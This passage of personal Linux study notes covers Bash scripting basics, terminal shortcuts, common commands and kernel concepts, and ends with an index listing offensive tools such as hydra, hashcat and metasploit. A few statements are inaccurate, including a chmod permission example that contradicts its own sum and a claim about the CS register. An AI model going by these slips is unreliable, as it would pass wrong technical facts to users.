<li>$# - How many arguments were passed to the Bash script.</li>
<li>$@ - All the arguments supplied to the Bash script.</li>
<li>$? - The exit status of the most recently run process.</li>
<li><code>$$</code> - The process ID of the current script.</li>
<li>$USER - The username of the user running the script.</li>
<li>$HOSTNAME - The hostname of the machine the script is running on.</li>
<li>$SECONDS - The number of seconds since the script was started.</li>
<li>$RANDOM - Returns a different random number each time is it referred to.</li>
<li>$LINENO - Returns the current line number in the Bash script.`</li>
</ul>
<h2 id="input"><a class="header" href="#input">Input</a></h2>
<h3 id="command-line-input"><a class="header" href="#command-line-input">Command Line Input</a></h3>
<pre><code class="language-**sh**">#!/bin/bash
# A simple copy script
cp $1 $2
# Let's verify the copy worked
echo Details for $2
ls -lh $2
</code></pre>
<h3 id="input-in-scripts"><a class="header" href="#input-in-scripts">Input in scripts</a></h3>
<p>If we would like to ask the user for input in a script, we use a command called <code>read</code>. This command takes the input and will save it into a variable.</p>
<pre><code class="language-sh">#!/bin/bash
# Ask the user for their name
echo Hello, who am I talking to?
read varname
echo It\'s nice to meet you $varname
</code></pre>
<p>You are able to alter the behaviour of <code>read</code> with a variety of command line options. (See the man page for read to see all of them.) Two commonly used options however are <code>-p</code> which allows you to specify a prompt and <code>-s</code> which makes the input silent. This can make it easy to ask for a username and password combination like the example below:</p>
<pre><code class="language-sh">#!/bin/bash
# Ask the user for login details
read -p 'Username: ' uservar
read -sp 'Password: ' passvar
echo
echo Thankyou $uservar we now have your login details
</code></pre>
<p>You can use <code>read</code> to get multiple variables as well:</p>
<pre><code class="language-sh">#!/bin/bash
# Demonstrate how read actually works
echo What cars do you like?
read car1 car2 car3
echo Your first car was: $car1
echo Your second car was: $car2
echo Your third car was: $car3
</code></pre>
<h3 id="input-from-stdin"><a class="header" href="#input-from-stdin">Input from stdin</a></h3>
<pre><code class="language-sh">#!/bin/bash
# A basic summary of my sales report
echo Here is a summary of the sales data:
echo ====================================
echo
cat /dev/stdin | cut -d' ' -f 2,3 | sort
</code></pre>
<h2 id="arithmetic"><a class="header" href="#arithmetic">Arithmetic</a></h2>
<h3 id="let"><a class="header" href="#let">let</a></h3>
<p>let is a builtin function of Bash that allows us to do simple arithmetic. It follows the basic format:</p>
<pre><code class="language-sh">#!/bin/bash
# Basic arithmetic using let
let a=5+4
echo $a # 9
let "a = 5 + 4"
echo $a # 9
let a++
echo $a # 10
let "a = 4 * 5"
echo $a # 20
let "a = $1 + 30"
echo $a # 30 + first command line argument
</code></pre>
<p>Here is a table with some common operations:</p>
<div class="table-wrapper">
<table>
<thead>
<tr><th>Operator</th><th>Operation</th></tr>
</thead>
<tbody>
<tr><td>+, -, *, /</td><td>addition, subtraction, multiply, divide</td></tr>
<tr><td>var++</td><td>Increase the variable var by 1</td></tr>
<tr><td>var‚Äì</td><td>Decrease the variable var by 1</td></tr>
<tr><td>%</td><td>Modulus (Return the remainder after division)</td></tr>
</tbody>
</table>
</div>
<h2 id="conditionals-2"><a class="header" href="#conditionals-2">Conditionals</a></h2>
<p>If statements (and, closely related, case statements) allow us to make decisions in our Bash scripts. They allow us to decide whether or not to run a piece of code based upon conditions that we may set. If statements, combined with loops (which we‚Äôll look at in the next section) allow us to make much more complex scripts which may solve larger tasks.</p>
<h3 id="if-statements"><a class="header" href="#if-statements">If Statements</a></h3>
<pre><code class="language-sh">if [ &lt;some test&gt; ]
then
  &lt;commands&gt;
fi
</code></pre>
<p>Anything between then and fi (if backwards) will be executed only if the test (between the square brackets) is true.</p>
<p>Let‚Äôs look at a simple example:</p>
<pre><code class="language-sh">#!/bin/bash
if [ $1 -gt 100 ]
then
  echo Hey that\'s a large number.
  pwd
fi
date
</code></pre>
<pre><code class="language-sh">03:54:59 ryan@localhost $./test.sh 134
Hey that's a large number.
/repos/PersonalProjects/shell
Tue Jan 17 15:55:03 EST 2023
</code></pre>
<p>The square brackets [] in the if statement above are actually a reference to the <code>test</code> command. This means that all of the operators that <code>test</code> allows may be used here as well.</p>
<h4 id="ifelifelse"><a class="header" href="#ifelifelse">if/elif/else</a></h4>
<pre><code class="language-sh">#!/bin/bash
# elif statements
if [ $1 -ge 18 ]
then
  echo You may go to the party.
elif [ $2 == 'yes' ]
then
  echo You may go to the party but be back before midnight.
else
  echo You may not go to the party.
fi
</code></pre>
<h3 id="case-statements"><a class="header" href="#case-statements">case statements</a></h3>
<p>Sometimes we may wish to take different paths based upon a variable matching a series of patterns. We could use a series of if and elif statements but that would soon grow to be unweildly. Fortunately there is a case statement which can make things cleaner. It‚Äôs a little hard to explain so here are some examples to illustrate:</p>
<pre><code class="language-sh">#!/bin/bash
# case example
case $1 in
  start)
    echo starting
    ;;
  stop)
    echo stoping
    ;;
  restart)
    echo restarting
    ;;
  *)
    echo don\'t know
    ;;
esac
</code></pre>
<h2 id="loops-1"><a class="header" href="#loops-1">Loops</a></h2>
<h3 id="while-loops"><a class="header" href="#while-loops">while loops</a></h3>
<pre><code class="language-sh">#!/bin/bash

# Basic while loop

counter=1
while [ $counter -le 10 ]
do
  echo $counter
  ((counter++))
done
echo All done
</code></pre>
<h3 id="until-loop"><a class="header" href="#until-loop">until loop</a></h3>
<pre><code class="language-sh">#!/bin/bash

# Basic until loop

counter=1
until [ $counter -gt 10 ]
do
  echo $counter
  ((counter++))
done
echo All done
</code></pre>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="moving-the-cursor-1"><a href="#moving-the-cursor-1" class="header">Moving the cursor:</a></h1>
<h2 id="moving-the-cursor"><a class="header" href="#moving-the-cursor">Moving the cursor:</a></h2>
<pre><code>  Ctrl + a   Go to the beginning of the line (Home)
  Ctrl + e   Go to the End of the line (End)
  Ctrl + p   Previous command (Up arrow)
  Ctrl + n   Next command (Down arrow)
   Alt + b   Back (left) one word
   Alt + f   Forward (right) one word
  Ctrl + f   Forward one character
  Ctrl + b   Backward one character
  Ctrl + xx  Toggle between the start of line and current cursor position
</code></pre>
<h2 id="editing-1"><a class="header" href="#editing-1">Editing:</a></h2>
<pre><code> Ctrl + L   Clear the Screen, similar to the clear command

  Alt + Del Delete the Word before the cursor.
  Alt + d   Delete the Word after the cursor.
 Ctrl + d   Delete character under the cursor
 Ctrl + h   Delete character before the cursor (Backspace)

 Ctrl + w   Cut the Word before the cursor to the clipboard.
 Ctrl + k   Cut the Line after the cursor to the clipboard.
 Ctrl + u   Cut/delete the Line before the cursor to the clipboard.

  Alt + t   Swap current word with previous
 Ctrl + t   Swap the last two characters before the cursor (typo).
 Esc  + t   Swap the last two words before the cursor.

 ctrl + y   Paste the last thing to be cut (yank)
  Alt + u   UPPER capitalize every character from the cursor to the end of the current word.
  Alt + l   Lower the case of every character from the cursor to the end of the current word.
  Alt + c   Capitalize the character under the cursor and move to the end of the word.
  Alt + r   Cancel the changes and put back the line as it was in the history (revert).
 ctrl + _   Undo

 TAB        Tab completion for file/directory names
For example, to move to a directory 'sample1'; Type cd sam ; then press TAB and ENTER.
type just enough characters to uniquely identify the directory you wish to open.
</code></pre>
<h2 id="special-keys-tab-backspace-enter-esc"><a class="header" href="#special-keys-tab-backspace-enter-esc">Special keys: Tab, Backspace, Enter, Esc</a></h2>
<pre><code>Text Terminals send characters (bytes), not key strokes.
Special keys such as Tab, Backspace, Enter and Esc are encoded as control characters.
Control characters are not printable, they display in the terminal as ^ and are intended to have an effect on applications.

Ctrl+I = Tab
Ctrl+J = Newline
Ctrl+M = Enter
Ctrl+[ = Escape

Many terminals will also send control characters for keys in the digit row:
Ctrl+2 ‚Üí ^@
Ctrl+3 ‚Üí ^[ Escape
Ctrl+4 ‚Üí ^\
Ctrl+5 ‚Üí ^]
Ctrl+6 ‚Üí ^^
Ctrl+7 ‚Üí ^_ Undo
Ctrl+8 ‚Üí ^? Backward-delete-char

Ctrl+v tells the terminal to not interpret the following character, so Ctrl+v Ctrl-I will display a tab character,
similarly Ctrl+v ENTER will display the escape sequence for the Enter key: ^M
</code></pre>
<h2 id="history"><a class="header" href="#history">History:</a></h2>
<pre><code>  Ctrl + r   Recall the last command including the specified character(s).
             searches the command history as you type.
             Equivalent to : vim ~/.bash_history.
  Ctrl + p   Previous command in history (i.e. walk back through the command history).
  Ctrl + n   Next command in history (i.e. walk forward through the command history).

  Ctrl + s   Go back to the next most recent command.
             (beware to not execute it from a terminal because this will also launch its XOFF).
  Ctrl + o   Execute the command found via Ctrl+r or Ctrl+s
  Ctrl + g   Escape from history searching mode
        !!   Repeat last command
       !n    Repeat from the last command: args n e.g. !:2 for the second argumant.
       !n:m  Repeat from the last command: args from n to m. e.g. !:2-3 for the second and third.
       !n:$  Repeat from the last command: args n to the last argument.
       !n:p  Print last command starting with n
     !string Print the last command beginning with string.
       !:q   Quote the last command with proper Bash escaping applied.
              Tip: enter a line of Bash starting with a # comment, then run !:q on the next line to escape it.
        !$   Last argument of previous command.
   ALT + .   Last argument of previous command.
        !*   All arguments of previous command.
^abc¬≠^¬≠def   Run previous command, replacing abc with def
</code></pre>
<h2 id="process-control"><a class="header" href="#process-control">Process control:</a></h2>
<pre><code> Ctrl + C   Interrupt/Kill whatever you are running (SIGINT).
 Ctrl + l   Clear the screen.
 Ctrl + s   Stop output to the screen (for long running verbose commands).
            Then use PgUp/PgDn for navigation.
 Ctrl + q   Allow output to the screen (if previously stopped using command above).
 Ctrl + D   Send an EOF marker, unless disabled by an option, this will close the current shell (EXIT).
 Ctrl + Z   Send the signal SIGTSTP to the current task, which suspends it.
            To return to it later enter fg 'process name' (foreground).
</code></pre>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="commands-3"><a class="header" href="#commands-3">Commands</a></h1>
<h2 id="directory-map-26"><a class="header" href="#directory-map-26">Directory Map</a></h2>
<ul>
<li><a href="#chgrp">chgrp</a></li>
<li><a href="#chmod">chmod</a></li>
<li><a href="#chown">chown</a></li>
<li><a href="#dd">dd</a></li>
<li><a href="#groups-2">groups</a></li>
<li><a href="#ip">ip</a></li>
<li><a href="#job-control">jobcontrol</a></li>
<li><a href="#kill">kill</a></li>
<li><a href="#lsscsi">lsscsi</a></li>
<li><a href="#passwd">passwd</a></li>
<li><a href="#ps">ps</a></li>
<li><a href="#umask">umask</a></li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="chgrp"><a class="header" href="#chgrp">chgrp</a></h1>
<p><code>chgrp</code> can be used to change the owning group of a file or directory</p>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="chmod"><a class="header" href="#chmod">Chmod</a></h1>
<p>Chmod is used to manage permissions (mode) on a file or directory</p>
<p>The syntax of the chmod command when using the symbolic mode has the following format:</p>
<pre><code>chmod [OPTIONS] NUMBER FILE...
</code></pre>
<p>When using the numeric mode, you can set the permissions for all three user classes (owner, group, and all others) at the same time.</p>
<p>The permission number can be a 3 or 4-digits number. When 3 digits number is used, the first digit represents the permissions of the file‚Äôs owner, the second one the file‚Äôs group, and the last one all other users.</p>
<p>Each write, read, and execute permissions have the following number value:</p>
<ul>
<li>r (read) = 4</li>
<li>w (write) = 2</li>
<li>x (execute) = 1</li>
<li>no permissions = 0</li>
</ul>
<p>The permissions number of a specific user class is represented by the sum of the values of the permissions for that group.</p>
<p>To find out the file‚Äôs permissions in numeric mode, simply calculate the totals for all users‚Äô classes. For example, to give read, write and execute permission to the file‚Äôs owner, read and execute permissions to the file‚Äôs group and only read permissions to all other users, you would do the following:</p>
<ul>
<li>Owner: rwx=4+2+1=7</li>
<li>Group: r-x=4+0+1=5</li>
<li>Others: r-x=4+0+0=4</li>
</ul>
<p>Using the method above, we come up to the number 754, which represents the desired permissions.</p>
<p>When the 4 digits number is used, the first digit has the following meaning:</p>
<ul>
<li>setuid=4</li>
<li>setgid=2</li>
<li>sticky=1</li>
<li>no changes = 0</li>
</ul>
<p>The next three digits have the same meaning as when using 3 digits number.</p>
<p>If the first digit is 0 it can be omitted, and the mode can be represented with 3 digits. The numeric mode 0755 is the same as 755.</p>
<p>To calculate the numeric mode, you can also use another method (binary method), but it is a little more complicated. Knowing how to calculate the numeric mode using 4, 2, and 1 is sufficient for most users.</p>
<p>You can check the file‚Äôs permissions in the numeric notation using the stat command:</p>
<p><code>stat -c "%a" file_name</code></p>
<h4 id="here-are-some-examples-of-how-to-use-the-chmod-command-in-numeric-mode"><a class="header" href="#here-are-some-examples-of-how-to-use-the-chmod-command-in-numeric-mode">Here are some examples of how to use the chmod command in numeric mode:</a></h4>
<ul>
<li>Give the file‚Äôs owner read and write permissions and only read permissions to group members and all other users:</li>
</ul>
<p><code>chmod 644 dirname</code></p>
<ul>
<li>Give the file‚Äôs owner read, write and execute permissions, read and execute permissions to group members and no permissions to all other users:</li>
</ul>
<p><code>chmod 750 dirname</code></p>
<ul>
<li>Give read, write, and execute permissions, and a sticky bit to a given directory:</li>
</ul>
<p><code>chmod 1777 dirname</code></p>
<ul>
<li>Recursively set read, write, and execute permissions to the file owner and no permissions for all other users on a given directory:</li>
</ul>
<p><code>chmod -R 700 dirname</code></p>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="chown"><a class="header" href="#chown">chown</a></h1>
<p><code>chown</code> can be used to change the owning user</p>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="dd"><a class="header" href="#dd">dd</a></h1>
<ul>
<li>dd is useful when working with block and character devices</li>
<li>dd‚Äôs sole purpose is to read from an input file or stream and write to an output file or stream</li>
<li>dd copies data in blocks of a fixed size</li>
</ul>
<h4 id="example-usage-1"><a class="header" href="#example-usage-1">example usage</a></h4>
<pre><code class="language-sh">dd if=/dev/zero of=new_file bs=1024 count=1
</code></pre>
<p>the <code>dd</code> command syntax differs from most other unix style commands. It is based on an old IBM job control language (JCL) style.</p>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="groups-2"><a class="header" href="#groups-2">groups</a></h1>
<p><code>groups</code> can be used to view what group memberships a user has</p>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="ip"><a class="header" href="#ip">ip</a></h1>
<p>Show IP stack Info</p>
<h4 id="example-6"><a class="header" href="#example-6">Example</a></h4>
<pre><code>$ ip addr
1: lo:  mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
      valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host
      valid_lft forever preferred_lft forever
2: eth0:  mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 00:22:48:27:87:eb brd ff:ff:ff:ff:ff:ff
    inet 172.16.1.4/24 brd 172.16.1.255 scope global noprefixroute eth0
      valid_lft forever preferred_lft forever
    inet6 fe80::222:48ff:fe27:87eb/64 scope link
      valid_lft forever preferred_lft forever
3: enP12806s1:  mtu 1500 qdisc mq master eth0 state UP group default qlen 1000
    link/ether 00:22:48:27:87:eb brd ff:ff:ff:ff:ff:ff
</code></pre>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="job-control"><a class="header" href="#job-control">Job Control</a></h1>
<p>Normally, when you start a command in a shell, you don‚Äôt get the shell prompt back until the program finishes executing. You can detach a process from the shell using the ampersand (&amp;), which will send it to the background.</p>
<p>You can use <code>jobs</code> to view currently running background jobs.
You can use <code>fg &lt;pid&gt;</code> to bring a background process back to the foreground.</p>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="kill"><a class="header" href="#kill">Kill</a></h1>
<h2 id="kill-can-be-used-to-kill-a-process"><a class="header" href="#kill-can-be-used-to-kill-a-process">kill can be used to kill a process</a></h2>
<h4 id="usageoutput"><a class="header" href="#usageoutput">Usage/Output</a></h4>
<pre><code>$ kill 22541
[1]+  Terminated              sleep 60
</code></pre>
<h4 id="commonly-used-options"><a class="header" href="#commonly-used-options">Commonly Used Options</a></h4>
<ul>
<li>Kill can be used without any options. However, you can also specify what signal to use:</li>
</ul>
<pre><code>$ kill -l
 1) SIGHUP       2) SIGINT       3) SIGQUIT      4) SIGILL       5) SIGTRAP
 6) SIGABRT      7) SIGBUS       8) SIGFPE       9) SIGKILL     10) SIGUSR1
11) SIGSEGV     12) SIGUSR2     13) SIGPIPE     14) SIGALRM     15) SIGTERM
16) SIGSTKFLT   17) SIGCHLD     18) SIGCONT     19) SIGSTOP     20) SIGTSTP
21) SIGTTIN     22) SIGTTOU     23) SIGURG      24) SIGXCPU     25) SIGXFSZ
26) SIGVTALRM   27) SIGPROF     28) SIGWINCH    29) SIGIO       30) SIGPWR
31) SIGSYS      34) SIGRTMIN    35) SIGRTMIN+1  36) SIGRTMIN+2  37) SIGRTMIN+3
38) SIGRTMIN+4  39) SIGRTMIN+5  40) SIGRTMIN+6  41) SIGRTMIN+7  42) SIGRTMIN+8
43) SIGRTMIN+9  44) SIGRTMIN+10 45) SIGRTMIN+11 46) SIGRTMIN+12 47) SIGRTMIN+13
48) SIGRTMIN+14 49) SIGRTMIN+15 50) SIGRTMAX-14 51) SIGRTMAX-13 52) SIGRTMAX-12
53) SIGRTMAX-11 54) SIGRTMAX-10 55) SIGRTMAX-9  56) SIGRTMAX-8  57) SIGRTMAX-7
58) SIGRTMAX-6  59) SIGRTMAX-5  60) SIGRTMAX-4  61) SIGRTMAX-3  62) SIGRTMAX-2
63) SIGRTMAX-1  64) SIGRTMAX
</code></pre>
<pre><code>$ sleep 60 &amp;
[1] 22661
$ kill -s 9 22661
[1]+  Killed                  sleep 60

</code></pre>
<ul>
<li>If you do not specify a signal, SIGTERM (15) is used</li>
<li>You can stop a process (it will still reside in memory) with signal 19, and resume it with signal 18</li>
<li>All signals except for SIGKILL (9) can be ignored. SIGKILL does not give a process the change to clean up after itself or finish work. The kernel immediately terminates the process and forcibly removes it from memory.</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="lsscsi"><a class="header" href="#lsscsi">lsscsi</a></h1>
<ul>
<li>can be used to walk the SCSI device paths provided by <code>sysfs</code></li>
<li>not installed on most systems by default</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="passwd"><a class="header" href="#passwd">passwd</a></h1>
<p>Can be used to manipulate user passwords</p>
<p>Example:
<code>passwd ryan</code></p>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="ps"><a class="header" href="#ps">ps</a></h1>
<h2 id="ps-is-used-for-viewing-process-status"><a class="header" href="#ps-is-used-for-viewing-process-status">ps is used for viewing process status</a></h2>
<h4 id="usageoutput-1"><a class="header" href="#usageoutput-1">Usage/Output</a></h4>
<pre><code>$ ps
PID        TTY     STAT   TIME          CMD
5140     pts/4    Ss        00:00:00     bash
61244    pts/4    R+        00:00:00     ps
</code></pre>
<ul>
<li>PID = the process Id</li>
<li>TTY = the terminal device where the process is running</li>
<li>STAT = the current status of the process. It can be ‚Äòs‚Äô for sleeping, ‚Äòr‚Äô for running. See the man page ps(1) for more info</li>
<li>TIME = the CPU time that the process has used. Note that this is different than the ‚Äòwall-clock‚Äô time</li>
<li>CMD = the command used to start the process</li>
</ul>
<h4 id="commonly-used-options-1"><a class="header" href="#commonly-used-options-1">Commonly Used Options</a></h4>
<p>There are many options available to the <code>ps</code> command. To make things more confusing, you can specify options in 3 different styles - Unix, BSD, and GNU. Most people use the BSD style, as it is seemingly most comfortable to use (less typing).</p>
<p>Here are some of the most commonly used BSD-style options:</p>
<ul>
<li><code>ps x</code> = show all of your running processes</li>
<li><code>ps ax</code> = show all processes on the system, not just those that you own</li>
<li><code>ps u</code> = Include more detailed information on processes</li>
<li><code>ps w</code> = show full command names, not just what fits on a single line</li>
<li><code>ps u $$</code> = status of the current process</li>
<li><code>ps aux</code> = show all processes for all users with verbose detail</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="umask"><a class="header" href="#umask">umask</a></h1>
<p>See page 37</p>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="greybeard-qualification-1"><a class="header" href="#greybeard-qualification-1">Greybeard Qualification</a></h1>
<h2 id="directory-map-27"><a class="header" href="#directory-map-27">Directory Map</a></h2>
<ul>
<li><a href="#block-devices-and-file-systems">block_dev_and_file_systems</a></li>
<li><a href="#memory-management-1">memory_management</a></li>
<li><a href="#execution-and-scheduling-of-processes-and-threads">process_execution_and_scheduling</a></li>
<li><a href="#process-structure-and-ipc">process_structure_and_ipc</a></li>
<li><a href="#startup-and-init">startup_and_init</a></li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="block-devices-and-file-systems"><a class="header" href="#block-devices-and-file-systems">Block Devices and File Systems</a></h1>
<h2 id="device-special-files"><a class="header" href="#device-special-files">Device Special Files</a></h2>
<ul>
<li>In Linux, everything is a File</li>
<li><code>/dev</code> contains device files</li>
<li><code>mknod</code> can be used to make a device file
<ul>
<li>Example: <code>mknod mydevice b 1 1</code></li>
</ul>
</li>
<li><code>udev</code> manages devices, it creates the device files in the <code>/dev</code> directory</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="memory-management-1"><a class="header" href="#memory-management-1">Memory Management</a></h1>
<ul>
<li><code>pmap &lt;pid&gt;</code>
<ul>
<li>any line showing ‚Äòanon‚Äô memory is the heap</li>
</ul>
</li>
<li>page tables are supported directly by the CPU and memory management unit (MMU)</li>
<li>The page table turns logical memory addresses into real RAM addresses</li>
<li>The kernel allocates pages</li>
<li>Pages are allocated and mapped when a program is loaded at run time</li>
<li>When a program needs more memory, allocate from the heap</li>
<li>Processes that need a shared library will all reference the same pages for that shared object in memory</li>
<li>If you don‚Äôt have enough memory available, pages are swapped out to disk
<ul>
<li>Create swap space with <code>mkswap</code></li>
<li>Start with <code>swapon</code></li>
<li>Any partition with type 82 will be allocated as swap type at boot</li>
</ul>
</li>
<li><code>/proc/&lt;pid&gt;/smaps</code>
<ul>
<li>Detailed information about paging for a process</li>
</ul>
</li>
<li>‚Äò/proc/meminfo‚Äô</li>
<li>RSS: Resident set size
<ul>
<li>How much virtual memory is in real memory</li>
</ul>
</li>
<li>Thrashing</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="execution-and-scheduling-of-processes-and-threads"><a class="header" href="#execution-and-scheduling-of-processes-and-threads">Execution and Scheduling of Processes and Threads</a></h1>
<h2 id="how-are-processes-made"><a class="header" href="#how-are-processes-made">How are processes made?</a></h2>
<ul>
<li>Processes are created with <code>fork()</code></li>
<li>The new process created with <code>fork()</code> is an exact copy of its parent
<ul>
<li>Everything is copied from the parent except for file locks and any pending signals</li>
<li>the <code>fork()</code> system call has a return value of &gt; 0 if you‚Äôre the parent, if you‚Äôre the child the value will be 0. If there is an error the return value will be less than 0.</li>
<li><code>fork()</code> doesn‚Äôt copy all memory to the child at first. The child process shares the memory of the parent until the child or parent needs to write to the memory. Then the process that needs to modify the memory makes a copy of just that page and makes it‚Äôs change. This is called Copy On Write (COW).</li>
<li>On Linux, c libraries typically implement fork() by wrapping clone()</li>
</ul>
</li>
</ul>
<h2 id="daemons"><a class="header" href="#daemons">Daemon‚Äôs</a></h2>
<ul>
<li>Services / background processes</li>
<li>How to make a daemon:
<ul>
<li>Fork the parent process, then the parent exits, leaving the child process with parent init (pid=1)</li>
<li>Close all open file‚Äôs</li>
<li>Become the process group leader
<ul>
<li>a Process Group</li>
</ul>
</li>
<li>Set the umask</li>
<li>Change dir to a safe place</li>
<li>Possibly ignore some signals</li>
</ul>
</li>
</ul>
<h2 id="process-scheduling"><a class="header" href="#process-scheduling">Process Scheduling</a></h2>
<ul>
<li>Priority determines which process gets to run</li>
<li>The kernel constantly has to decide which process to run next</li>
<li>Context switching involves moving register values out of the CPU and into memory, and loading registers for the next process to run</li>
<li>Every process has a task state associated with it. The states are:
<ul>
<li>TASK_RUNNING
<ul>
<li>Processes in the running state have a time quantum to run within. By default, 100ms.</li>
<li>The kernel checks the process time quantum every tick.</li>
</ul>
</li>
<li>TASK_INTERRUPTABLE</li>
<li>TASK_UNINTERRUPTABLE
<ul>
<li>This is rare</li>
</ul>
</li>
<li>TASK_STOPPED</li>
<li>TASK_TRACED
<ul>
<li>Example: tracing the process with <code>strace</code></li>
</ul>
</li>
<li>EXIT_ZOMBIE</li>
<li>EXIT_DEAD</li>
</ul>
</li>
</ul>
<h2 id="threads-1"><a class="header" href="#threads-1">Threads</a></h2>
<ul>
<li>a thread is a lightweight process</li>
<li>Threads of a process all run in the same memory address space
<ul>
<li>A thread has its own instruction pointer</li>
<li>The stack is not shared. Each has its own stack.</li>
<li>In linux all threads have their own PID</li>
<li>Threads will spin (spin-lock) if they are waiting to access memory that is locked by another thread
<ul>
<li>Processes that are spinning do not go to sleep or cede back to the kernel</li>
</ul>
</li>
</ul>
</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="process-structure-and-ipc"><a class="header" href="#process-structure-and-ipc">Process Structure and IPC</a></h1>
<h2 id="what-is-a-process"><a class="header" href="#what-is-a-process">What is a process?</a></h2>
<ul>
<li>A running program</li>
<li>Executable binary (ELF File)</li>
<li>A set of data structures in the kernel
<ul>
<li>This is the process itself</li>
<li>Helps the kernel keep track of resources used by the process (open files, mmap, etc.)</li>
</ul>
</li>
<li>Unit to which the kernel allocates resources</li>
<li>Parts of a process:
<ul>
<li>PID</li>
<li>PPID</li>
<li>Open files
<ul>
<li>Array of file descriptors in task struct (0 is stdin, 1 is stdout, 2 is stderr, and so on‚Ä¶)</li>
</ul>
</li>
<li>TTY (pseudo tty nowadays)</li>
<li>UID (a signed integer)
<ul>
<li>a process can change its UID by using setuid</li>
</ul>
</li>
<li>GUID (a signed integer)</li>
<li>Priority (can be set with nice value (renice for already running processes))</li>
<li>limits (rlimit)</li>
<li>timestamps / counters</li>
</ul>
</li>
<li>processes are defined as task_struct in sched.h of the source</li>
<li>What can you do with a process?
<ul>
<li>Create</li>
<li>Send a signal (kill)</li>
<li>Get information about (ps, pidof, etc.)</li>
</ul>
</li>
</ul>
<h2 id="process-memory"><a class="header" href="#process-memory">Process memory</a></h2>
<ul>
<li>Heap grows up</li>
<li>Stack grows down</li>
<li>Data section for initialized variables and data</li>
<li><code>malloc</code> to allocate memory on the heap</li>
<li><code>free</code> to free memory from the heap</li>
<li>You can see the mmap of a running process using <code>pmap &lt;pid&gt;</code></li>
</ul>
<h2 id="resource-limits"><a class="header" href="#resource-limits">Resource Limit‚Äôs</a></h2>
<ul>
<li>rlimits or ulimits (shell)</li>
<li><code>getrlimit()</code> or <code>setrlimit()</code></li>
<li><code>ulimit -a</code> to view limits</li>
<li>Use to control users, processes</li>
<li>Usage is not common these days</li>
<li>Default limits exist</li>
<li>stored in <code>/etc/security/limits.conf</code></li>
</ul>
<h2 id="process-priority"><a class="header" href="#process-priority">Process Priority</a></h2>
<ul>
<li>Set nice value with <code>nice</code> command</li>
<li>nice() system call</li>
<li>a regular user can only increase the nice value (decreasing its priority)</li>
<li>in all cases, higher number means lower priority</li>
<li><code>top</code> and <code>ps -eo</code> can be used to view the nice value</li>
<li>Default value for nice is 0</li>
</ul>
<h1 id="ipc"><a class="header" href="#ipc">IPC</a></h1>
<ul>
<li>How processes talk to each other</li>
<li>Also available but used left often, FIFO, semaphores, shared memory</li>
<li>Sockets, pipes, signals</li>
<li>Pipes exist entirely in memory, no files or disk IO are involved</li>
<li>Pipes can only exist between members of the same family in the process tree</li>
<li>If you want a pipe between processes that are not in the same process family tree, you can use FIFO, which are a file on the disk <code>mkfifo</code></li>
<li>View all signals with the <code>kill</code> command</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="startup-and-init"><a class="header" href="#startup-and-init">Startup and Init</a></h1>
<ul>
<li>Bootstrapping
<ul>
<li>First thing that happens when you power on a system is a positive voltage (5v) is applied to the reset pin of the CPU</li>
<li>Two registers are initialized:
<ul>
<li>CS Register: Has the address of the stack</li>
<li>EIP Register: The current instruction to execute</li>
</ul>
</li>
<li>Load the BIOS from ROM
<ul>
<li>Linux doesn‚Äôt use the BIOS after boot, it only uses device drivers loaded by the kernel</li>
<li>MSDOS used the BIOS to execute system calls</li>
<li>BIOS Steps:
<ol>
<li>POST (Power on self test)</li>
<li>ACPI - builds tables of devices with information regrading power. Can be used to decide when a system can power down a device or set it to a lower power level</li>
<li>Hardware Initialisation</li>
</ol>
<ul>
<li>3 ways to communicate with devices on a PC:
<ol>
<li>IO port from CPU to the device for communication via a port address</li>
<li>Map memory from the device to the address space of the computer and read/write to it</li>
<li>Use interrupts</li>
</ol>
</li>
</ul>
<ol start="4">
<li>Find a boot device by searching for a boot sector on each device.</li>
</ol>
<ul>
<li>First sector of a disk is the master boot record with contains the partition table and a boot loader (GRUB)</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="linux-kernel-development"><a class="header" href="#linux-kernel-development">Linux Kernel Development</a></h1>
<ul>
<li><a href="#building-the-linux-kernel">Building the Linux Kernel</a></li>
<li><a href="#kernel-modules">Kernel Modules</a></li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="building-the-linux-kernel"><a class="header" href="#building-the-linux-kernel">Building the Linux Kernel</a></h1>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="kernel-modules"><a class="header" href="#kernel-modules">Kernel Modules</a></h1>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="tools-4"><a class="header" href="#tools-4">Tools</a></h1>
<h2 id="directory-map-28"><a class="header" href="#directory-map-28">Directory Map</a></h2>
<ul>
<li><a href="#need-to-addrefine">cli-tool-improvements</a></li>
<li><a href="#instructions-for-using-dnspinger">dnspinger</a></li>
<li><a href="#ffuf">ffuf</a></li>
<li><a href="#hashcat">hashcat</a></li>
<li><a href="#hydra">hydra</a></li>
<li><a href="#john-the-ripper">john</a></li>
<li><a href="#lazagne">lazagne</a></li>
<li><a href="#medusa">medusa</a></li>
<li><a href="#metasploit-framework">metasploit</a></li>
